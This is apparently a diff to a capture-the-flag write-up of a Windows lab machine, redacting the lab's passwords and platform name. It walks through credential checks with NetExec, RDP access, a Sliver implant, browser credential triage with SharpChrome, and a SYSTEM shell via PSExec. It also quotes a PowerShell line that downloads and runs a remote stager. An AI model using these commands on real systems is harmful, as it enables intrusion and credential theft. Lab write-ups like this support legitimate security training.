@@ -14,7 +14,6 @@ tags: ["windows", "rdp", "credential-harvesting", "powershell-history", "psexec"
 
 ## Overview
 
-**Platform:** HackSmarter
 **OS:** Windows 11 / Server 2025
 **Difficulty:** Easy
 **IP:** `10.1.163.91`
@@ -29,7 +28,7 @@ Following a successful social engineering engagement, we obtained user-level cre
 ## Starting Credentials
 
 ```
-tyler.ramsey:P@ssw0rd!
+tyler.ramsey:[REDACTED]
 ```
 
 ---
@@ -85,20 +84,20 @@ session setup failed: NT_STATUS_ACCESS_DENIED
 Testing our starting credentials with NetExec confirms valid SMB access:
 
 ```bash
-nxc smb 10.1.163.91 -u tyler.ramsey -p 'P@ssw0rd!'
+nxc smb 10.1.163.91 -u tyler.ramsey -p '[REDACTED]'
 ```
 
 ```
 SMB  10.1.163.91  445  EC2AMAZ-M1LFCNO  [*] Windows 11 / Server 2025 Build 26100 x64
                                          (name:EC2AMAZ-M1LFCNO) (domain:EC2AMAZ-M1LFCNO)
                                          (signing:False) (SMBv1:False)
-SMB  10.1.163.91  445  EC2AMAZ-M1LFCNO  [+] EC2AMAZ-M1LFCNO\tyler.ramsey:P@ssw0rd!
+SMB  10.1.163.91  445  EC2AMAZ-M1LFCNO  [+] EC2AMAZ-M1LFCNO\tyler.ramsey:[REDACTED]
 ```
 
 Enumerating shares shows no accessible file shares beyond default:
 
 ```bash
-nxc smb 10.1.163.91 -u tyler.ramsey -p 'P@ssw0rd!' --shares
+nxc smb 10.1.163.91 -u tyler.ramsey -p '[REDACTED]' --shares
 ```
 
 ```
@@ -114,7 +113,7 @@ SMB  10.1.163.91  445  EC2AMAZ-M1LFCNO  IPC$        READ         Remote IPC
 Checking for coercion vulnerabilities:
 
 ```bash
-nxc smb 10.1.163.91 -u tyler.ramsey -p 'P@ssw0rd!' -M coerce_plus
+nxc smb 10.1.163.91 -u tyler.ramsey -p '[REDACTED]' -M coerce_plus
 ```
 
 ```
@@ -129,13 +128,13 @@ The host is vulnerable to PrinterBug and MS-EVEN coercion attacks, though these 
 Validating RDP access with our credentials:
 
 ```bash
-nxc rdp 10.1.163.91 -u tyler.ramsey -p 'P@ssw0rd!'
+nxc rdp 10.1.163.91 -u tyler.ramsey -p '[REDACTED]'
 ```
 
 ```
 RDP  10.1.163.91  3389  EC2AMAZ-M1LFCNO  [*] Windows 10 or Windows Server 2016 Build 26100
                                           (name:EC2AMAZ-M1LFCNO) (domain:EC2AMAZ-M1LFCNO) (nla:True)
-RDP  10.1.163.91  3389  EC2AMAZ-M1LFCNO  [+] EC2AMAZ-M1LFCNO\tyler.ramsey:P@ssw0rd! (Pwn3d!)
+RDP  10.1.163.91  3389  EC2AMAZ-M1LFCNO  [+] EC2AMAZ-M1LFCNO\tyler.ramsey:[REDACTED] (Pwn3d!)
 ```
 
 RDP access confirmed.
@@ -147,7 +146,7 @@ RDP access confirmed.
 Connected to the target via RDP using `xfreerdp` or your preferred RDP client:
 
 ```bash
-xfreerdp /u:tyler.ramsey /p:'P@ssw0rd!' /v:10.1.163.91 /dynamic-resolution
+xfreerdp /u:tyler.ramsey /p:'[REDACTED]' /v:10.1.163.91 /dynamic-resolution
 ```
 
 ### Deploying Sliver Implant
@@ -205,7 +204,7 @@ During the RDP session, observed that Microsoft Edge was running. Used SharpChro
 [*] Triaging Edge Logins for current user
 
 [*] AES state key file : C:\Users\tyler.ramsey\AppData\Local\Microsoft\Edge\User Data\Local State
-[*] AES state key      : CB90A28DE1D1DA13828DB626ED04B777880A6259466B80DD6CA846A6F47C2AA0
+[*] AES state key      : [HASH REDACTED]
 
 SharpChrome completed in 00:00:00.7072436
 ```
@@ -239,7 +238,7 @@ C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Co
 The history file contained:
 
 ```powershell
-net user administrator "ebz0yxy3txh9BDE*yeh"
+net user administrator "[REDACTED]"
 IEX(IWR -UseBasicParsing http://10.200.19.150:8000/stager.ps1)
 ls
 .\implant.bin
@@ -262,14 +261,14 @@ Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\DeviceHealthAttestatio
 Confirmed the discovered credentials work:
 
 ```bash
-nxc smb 10.1.163.91 -u administrator -p 'ebz0yxy3txh9BDE*yeh'
+nxc smb 10.1.163.91 -u administrator -p '[REDACTED]'
 ```
 
 ```
 SMB  10.1.163.91  445  EC2AMAZ-M1LFCNO  [*] Windows 11 / Server 2025 Build 26100 x64
                                          (name:EC2AMAZ-M1LFCNO) (domain:EC2AMAZ-M1LFCNO)
                                          (signing:False) (SMBv1:False)
-SMB  10.1.163.91  445  EC2AMAZ-M1LFCNO  [+] EC2AMAZ-M1LFCNO\administrator:ebz0yxy3txh9BDE*yeh (Pwn3d!)
+SMB  10.1.163.91  445  EC2AMAZ-M1LFCNO  [+] EC2AMAZ-M1LFCNO\administrator:[REDACTED] (Pwn3d!)
 ```
 
 ### PSExec for SYSTEM Shell
@@ -277,7 +276,7 @@ SMB  10.1.163.91  445  EC2AMAZ-M1LFCNO  [+] EC2AMAZ-M1LFCNO\administrator:ebz0yx
 Used Impacket's PSExec to obtain a SYSTEM shell:
 
 ```bash
-impacket-psexec 'administrator':'ebz0yxy3txh9BDE*yeh'@10.1.163.91
+impacket-psexec 'administrator':'[REDACTED]'@10.1.163.91
 ```
 
 ```
@@ -305,8 +304,8 @@ C:\Users\Administrator\Desktop> type root.txt
 ## Credentials Found
 
 ```
-tyler.ramsey      : P@ssw0rd!            → User (RDP)
-administrator     : ebz0yxy3txh9BDE*yeh  → Administrator (SYSTEM via PSExec)
+tyler.ramsey      : [REDACTED]            → User (RDP)
+administrator     : [REDACTED]  → Administrator (SYSTEM via PSExec)
 ```
 
 ---
@@ -319,7 +318,7 @@ administrator     : ebz0yxy3txh9BDE*yeh  → Administrator (SYSTEM via PSExec)
      ▼
 ┌─────────────────────────────────────┐
 │  Starting Creds: tyler.ramsey       │
-│  P@ssw0rd!                          │
+│  [REDACTED]                         │
 └─────────────────────────────────────┘
      │
      ▼
